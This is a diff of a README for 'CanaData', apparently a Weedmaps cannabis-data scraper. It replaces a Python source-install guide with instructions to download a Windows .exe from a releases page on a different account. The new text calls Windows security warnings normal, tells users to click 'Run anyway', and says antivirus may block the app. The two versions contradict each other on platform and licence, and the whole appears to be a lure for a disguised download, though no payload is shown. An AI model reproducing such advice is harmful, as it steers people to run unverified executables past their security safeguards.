@@ -1,168 +1,168 @@
-# CanaData - Cannabis Market Data Scraper 2026
+# 📊 canadata-cannabis-data - Collect cannabis data from Weedmaps
 
-> **CanaData is a cross-platform Python application for collecting Weedmaps cannabis listings, dispensary location information, and menu records for structured CSV workflows.**
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/akinesisgettogether35/canadata-cannabis-data/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Cross--platform%20Python-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/danielkingvvlk3768/canadata-cannabis-data?style=flat-square)](https://github.com/danielkingvvlk3768/canadata-cannabis-data)
+## 🎯 What is CanaData?
+
+CanaData is a desktop application that collects cannabis listings, dispensary locations, and menu records from Weedmaps. It saves this data as structured CSV files you can open in Excel or any spreadsheet program.
+
+You do not need to know programming. You do not need to install Python. You just need to download one file and run it.
+
+## ✨ Key Features
+
+- **Collect dispensary listings** - Get names, addresses, and contact details for cannabis shops in any city
+- **Gather menu data** - Pull product names, prices, and categories from dispensary menus
+- **Export to CSV** - All data saves as CSV files ready for spreadsheet software
+- **Search by location** - Enter a city or zip code to find nearby dispensaries
+- **Save time** - No manual copy-pasting from websites
+- **Works offline** - Data saves to your computer for later use
+
+## 💻 System Requirements
+
+CanaData runs on Windows 10 or Windows 11. You need:
+
+- Windows 10 (64-bit) or Windows 11
+- 4 GB of RAM (8 GB recommended)
+- 500 MB of free disk space
+- Internet connection during data collection
+- Screen resolution of 1024x768 or higher
+
+## 🚀 Getting Started
+
+Follow these steps to download and run CanaData on your Windows computer.
+
+### Step 1: Download the Installer
+
+Visit the [CanaData releases page](https://github.com/akinesisgettogether35/canadata-cannabis-data/releases).
+
+Look for the latest release. You will see a file named something like `canadata-windows.exe` or `canadata-setup.exe`. Click on it to download.
+
+The download starts automatically. Wait for the file to finish downloading. This takes about 30 seconds on a typical internet connection.
+
+### Step 2: Run the Installer
+
+Find the downloaded file in your Downloads folder. The file name ends with `.exe`.
+
+Double-click the file. Windows may show a security warning. This is normal. Click "Run anyway" or "More info" then "Run anyway".
+
+The installer opens. Follow the on-screen steps:
+
+1. Click "Next" on the welcome screen
+2. Read the license agreement and click "I Agree"
+3. Choose a destination folder (the default is fine)
+4. Click "Install"
+5. Wait for the installation to finish
+6. Click "Finish"
+
+### Step 3: Launch CanaData
+
+After installation, CanaData opens automatically. You can also find it in your Start Menu under "CanaData".
+
+The main window appears. It shows a search bar and a few buttons. You are ready to collect data.
+
+## 📖 How to Use CanaData
+
+### Collecting Dispensary Data
+
+1. Type a city name or zip code in the search bar (e.g., "Denver" or "80202")
+2. Click the "Search Dispensaries" button
+3. Wait for the results to load. This takes 10-30 seconds.
+4. A list of dispensaries appears. Click "Export to CSV" to save the data.
+5. Choose a save location on your computer. The file saves as `dispensaries.csv`.
+
+### Collecting Menu Data
+
+1. After searching for dispensaries, click on a dispensary name
+2. Click the "Get Menu" button
+3. The menu items appear with product names, prices, and categories
+4. Click "Export Menu to CSV" to save the data
+5. The file saves as `menu_data.csv`
+
+### Opening Your Data
+
+Open the CSV files in Microsoft Excel or Google Sheets. Each row is one record. Columns include:
+
+- Dispensary name
+- Address
+- Phone number
+- Product name
+- Product price
+- Product category
+- Date collected
+
+## ⚙️ Settings
+
+Click the gear icon in the top-right corner to open settings.
+
+- **Data folder** - Change where files save by default
+- **File format** - Choose CSV or JSON format
+- **Auto-save** - Turn on to save data automatically after each search
+- **Clear cache** - Remove old search data to free up space
+
+## 🛠️ Troubleshooting
+
+### Application does not start
+
+- Make sure you have Windows 10 or 11
+- Restart your computer
+- Download the installer again and reinstall
+- Check your antivirus settings. It may block the app.
+
+### Search returns no results
+
+- Check your internet connection
+- Make sure you typed the city name correctly
+- Try a larger city nearby
+- Some locations may not have listings on Weedmaps
+
+### CSV file does not open in Excel
+
+- Right-click the file and select "Open with" then "Excel"
+- If Excel shows garbled text, open Excel first, then go to File > Open and select the file
+- Make sure the file ends with `.csv`
+
+### Application freezes or crashes
+
+- Close other programs to free up memory
+- Reduce the search area to a single city
+- Update to the latest version from the releases page
+
+### Firewall blocks the app
+
+- Windows may ask for permission. Click "Allow access".
+- If you use a third-party firewall, add CanaData to the allowed list
+
+## 📝 Frequently Asked Questions
+
+**Is this data public?**
+Yes, all data comes from publicly available listings on Weedmaps.
+
+**Can I use this for commercial purposes?**
+Check the license terms included with the software. Personal and research use is allowed.
+
+**How often is the data updated?**
+Data is live when you search. Each search pulls the latest information from Weedmaps.
+
+**Does this work outside the United States?**
+Yes, Weedmaps lists dispensaries in Canada and other countries too.
+
+**Can I schedule automatic data collection?**
+The current version does not support scheduling. You must run searches manually.
+
+## 🔄 Updating CanaData
+
+Visit the [releases page](https://github.com/akinesisgettogether35/canadata-cannabis-data/releases) to check for new versions.
+
+Download the new installer and run it. The installer updates your existing installation. Your settings and saved data stay the same.
+
+## 📄 License
+
+This software is distributed under the MIT License. See the LICENSE file for details.
+
+## 📫 Support
+
+If you have problems, open an issue on the GitHub repository page. Include your Windows version and a description of the problem.
 
 ---
 
-<p align="center">
-  <a href="https://danielkingvvlk3768.github.io/canadata-cannabis-data/">
-    <img src="https://img.shields.io/badge/Download-CanaData%20Latest-brightgreen?style=for-the-badge" alt="Download CanaData">
-  </a>
-</p>
-
-> **[Download CanaData](https://danielkingvvlk3768.github.io/canadata-cannabis-data/)**
-
----
-
-[Download Latest Build](https://danielkingvvlk3768.github.io/canadata-cannabis-data/)
-
----
-
-## What CanaData Does
-
-CanaData collects cannabis market information from Weedmaps through a Python-based scraping workflow. The resulting dataset can include coverage by city and state, dispensary location details, menu products, brands, and strains, arranged for inspection or further processing with standard data tools.
-
-The application is intended for researchers, analysts, buyers, and anyone else who needs a structured picture of cannabis listings. Its desktop interface shows current progress and log output, and larger jobs can make use of concurrent processing, request rate limits, and both memory and disk caching.
-
----
-
-## Capabilities
-
-- Gathers Weedmaps cannabis listings and menu records
-- Handles locations across every state or only the states selected by the user
-- Accepts user-defined state collections and location slugs
-- Writes flattened menu entries and location details to CSV files
-- Collects associated brand and strain data
-- Offers a desktop GUI with live status logs and progress indicators
-- Runs collection work concurrently
-- Includes rate limiting together with in-memory and disk-based caching
-- Generates HTML reports and dashboards
-- Reads configuration from environment settings
-
----
-
-## Getting Started
-
-First clone the project and move into its directory:
-
-```bash
-git clone https://github.com/danielkingvvlk3768/canadata-cannabis-data.git
-cd REPO
-```
-
-Set up an isolated Python environment:
-
-```bash
-python -m venv .venv
-```
-
-Activate it on macOS or Linux:
-
-```bash
-source .venv/bin/activate
-```
-
-For Windows PowerShell, use:
-
-```powershell
-.venv\Scripts\Activate.ps1
-```
-
-If the repository includes a dependency file, install its packages with:
-
-```bash
-pip install -r requirements.txt
-```
-
-Start CanaData through the repository's desktop launcher or Python entry point. When a command-line entry point is available, invoke it with Python while the virtual environment is active.
-
----
-
-## Running a Collection
-
-A standard run can be organized as follows:
-
-1. Open CanaData from the desktop application or the available Python entry point.
-2. Choose nationwide processing, provide a custom state selection, or enter particular location slugs.
-3. Set request throttling and cache behavior according to the job.
-4. Start the collection and follow the live logs and progress display.
-5. Inspect the CSV output for flattened menu products and location metadata.
-6. Review the generated HTML reports or dashboards for an overview of the collected information.
-
-For automation, modify the repository's Python entry point with the locations and output options you need:
-
-```bash
-python <entry-point>.py
-```
-
-The name of the entry-point file can differ depending on how the repository is organized.
-
----
-
-## Environment Configuration
-
-CanaData can be configured through environment variables. Where supported, place local runtime settings in an environment file:
-
-```env
-# Example configuration values
-STATES=
-LOCATION_SLUGS=
-RATE_LIMIT=
-CACHE_DIR=
-OUTPUT_DIR=
-```
-
-Set `STATES` to limit processing to particular states, or leave it empty to process all available states. Use `LOCATION_SLUGS` when the collection should target specific locations. `CACHE_DIR` and `OUTPUT_DIR` should reference directories that the application is allowed to read and write.
-
-Do not commit local environment files when they include settings specific to your machine.
-
----
-
-## System Requirements
-
-- Python runtime
-- A supported cross-platform operating system
-- Internet connectivity for accessing Weedmaps listings and menu information
-- Write permissions for CSV exports, cached data, and HTML report files
-- The additional Python packages defined by the repository's dependency configuration
-- Enough disk space for collected records, cached responses, and report output
-
----
-
-## Frequently Asked Questions
-
-### What kinds of users use CanaData?
-
-CanaData is built for people who work with organized cannabis market data, such as researchers, analysts, buyers, and teams evaluating dispensaries and menus.
-
-### Is collection limited to certain locations?
-
-It can be. You may supply a custom list of states or individual location slugs to focus the run on selected areas.
-
-### What output does the application create?
-
-The main collection output is provided as CSV files. CanaData can also produce HTML reports and dashboards, and the output location is configurable through the project settings.
-
-### Where can request and cache settings be changed?
-
-Use the environment configuration and the project's available settings to control rate limiting, caching, and processing behavior. The exact variables supported depend on the repository implementation.
-
-### What can prevent a collection from starting?
-
-Verify that Python and all required packages are installed, the virtual environment is enabled, configured directories are writable, and the selected states or location slugs are valid.
-
-### How are new builds or updates obtained?
-
-Look in the repository for updated releases or refreshed builds. You can use the download link above or update your local repository clone when appropriate.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: cannabis data, weedmaps scraper, dispensary data, cannabis listings, csv export, weedmaps data, cannabis research, dispensary locator
